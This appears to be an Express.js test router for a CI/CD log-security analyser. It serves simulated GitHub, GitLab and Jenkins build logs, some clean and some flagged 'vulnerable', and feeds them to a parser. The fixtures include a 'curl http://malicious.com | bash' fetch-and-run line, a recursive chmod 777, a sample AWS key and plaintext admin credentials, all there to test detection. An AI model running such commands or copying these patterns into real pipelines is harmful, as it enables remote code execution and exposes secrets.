const express = require('express');
const router = express.Router();
const axios = require('axios');
const prisma = require('../config/db');

// Templates definitions
const SCENARIOS = {
    github: {
        clean: {
            description: "GitHub Actions clean run",
            log: `##[group]Run actions/checkout@v4
with:
  repository: my-org/my-repo
  token: ***
##[endgroup]
##[group]Run npm install
added 123 packages in 2s
##[endgroup]
##[group]Run npm test
> test
> jest

PASS ./app.test.js
##[endgroup]`
        },
        vulnerable_unpinned: {
            description: "GitHub Actions using unpinned action",
            log: `##[group]Run actions/checkout@latest
Warning: uses: actions/checkout@latest is not pinned to a specific version.
##[endgroup]`
        },
        vulnerable_secret: {
            description: "GitHub Actions leaking AWS Secret",
            log: `##[group]Deploy to AWS
Running aws configure
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
##[endgroup]`
        },
        vulnerable_rce: {
            description: "GitHub Actions RCE attempt",
            log: `##[group]Run custom script
curl http://malicious.com | bash
##[endgroup]`
        }
    },
    gitlab: {
        clean: {
            description: "GitLab CI clean run",
            log: `Running with gitlab-runner 15.0.0
Preparing the "docker" executor
Using Docker executor with image node:16 ...
Starting section: build
$ npm install
added 50 packages
Section end: build
Starting section: test
$ npm test
PASS
Section end: test`
        },
        vulnerable_permissions: {
            description: "GitLab CI dangerous permissions",
            log: `Running with gitlab-runner
$ chmod 777 -R /var/www/html
$ chown root:root /app/config`
        }
    },
    jenkins: {
        clean: {
            description: "Jenkins clean build",
            log: `[Pipeline] Start of Pipeline
[Pipeline] node
[INFO] Scanning for projects...
[INFO] Building my-app 1.0-SNAPSHOT
[INFO] Total time: 2.345 s
[INFO] Finished: SUCCESS
[Pipeline] End of Pipeline`
        },
        vulnerable_sudo: {
            description: "Jenkins using sudo",
            log: `[Pipeline] sh
+ sudo apt-get update
[Pipeline] echo
Credentials found: admin/password123`
        }
    }
};

// @route   GET /test/scenarios
// @desc    List available test scenarios
router.get('/scenarios', (req, res) => {
    res.json(SCENARIOS);
});

// @route   POST /test/webhook
// @desc    Simulate a webhook with a specific scenario
// @body    { provider, scenario, repo_name, pipeline_name }
router.post('/webhook', async (req, res) => {
    const { provider, scenario, repo_name, pipeline_name } = req.body;

    // 1. Validation
    if (!provider || !scenario) {
        return res.status(400).json({ error: "Missing 'provider' or 'scenario'" });
    }

    const providerKey = provider.toLowerCase();
    if (!SCENARIOS[providerKey]) {
        return res.status(400).json({ error: `Invalid provider. content '${Object.keys(SCENARIOS).join(', ')}'` });
    }

    const scenarioData = SCENARIOS[providerKey][scenario];
    if (!scenarioData) {
        return res.status(400).json({ error: `Invalid scenario for ${provider}. content '${Object.keys(SCENARIOS[providerKey]).join(', ')}'` });
    }

    // 2. Generate Real Webhook Payload internally and process it
    // Instead of calling our own /webhook endpoint via HTTP (which might be cleaner but requires full URL),
    // we can reuse logic or just duplicate the "store and parse" logic here for testing purposes,
    // OR we can actually effectively call the logic.
    // Given the checklist says "Génère automatiquement le log... Insère dans MongoDB... Appelle LogParser",
    // it effectively mimics the real webhook handler.

    const run_id = `${providerKey}_${scenario}_${Date.now()}`;
    const logData = scenarioData.log;
    const finalRepoName = repo_name || `test-${provider}-repo`;
    const finalPipelineName = pipeline_name || `test-${scenario}-pipeline`;
    const providerEnum = providerKey.toUpperCase(); // GITHUB, GITLAB, JENKINS

    try {
        // Store in DB
        await prisma.log.create({
            data: {
                run_id: run_id,
                provider: providerEnum === 'JENKINS' || providerEnum === 'GITHUB' || providerEnum === 'GITLAB' ? providerEnum : 'API',
                repo_name: finalRepoName,
                pipeline_name: finalPipelineName,
                log_data: logData,
                author: 'test-user',
                timestamp_received: new Date()
            }
        });

        // Call LogParser
        const logParserUrl = process.env.LOGPARSER_URL || process.env.LOG_PARSER_URL || 'http://localhost:8001';
        let parseStatus = "skipped";

        try {
            console.log(`[TEST] Triggering LogParser at ${logParserUrl}/parse?run_id=${run_id}`);
            await axios.post(`${logParserUrl}/parse`, {}, {
                params: { run_id: run_id },
                timeout: 5000
            });
            parseStatus = "triggered_success";
        } catch (err) {
            console.error(`[TEST] LogParser trigger failed: ${err.message}`);
            parseStatus = "triggered_failed";
        }

        res.json({
            success: true,
            run_id: run_id,
            parsing_status: parseStatus,
            scenario_used: scenario
        });

    } catch (err) {
        console.error("Test Webhook Error:", err);
        res.status(500).json({ error: "Internal Test Error", details: err.message });
    }
});

module.exports = router;
